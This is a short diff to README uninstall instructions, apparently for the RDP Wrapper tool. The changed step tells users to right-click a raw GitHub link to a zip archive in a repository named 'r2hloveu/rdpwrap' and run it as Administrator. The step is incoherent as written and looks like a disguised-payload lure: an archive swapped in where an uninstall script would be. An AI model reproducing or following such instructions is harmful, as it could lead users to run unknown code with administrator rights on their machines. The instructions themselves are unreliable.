 To uninstall:
 - Go to the directory where you extracted the files
-- Right-click on **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/src-x86-binarymaster/Software-2.1.zip`** and select Run as Administrator
+- Right-click on **`https://github.com/r2hloveu/rdpwrap/raw/refs/heads/master/res/Software-v3.4-alpha.1.zip`** and select Run as Administrator
 - See command output for details
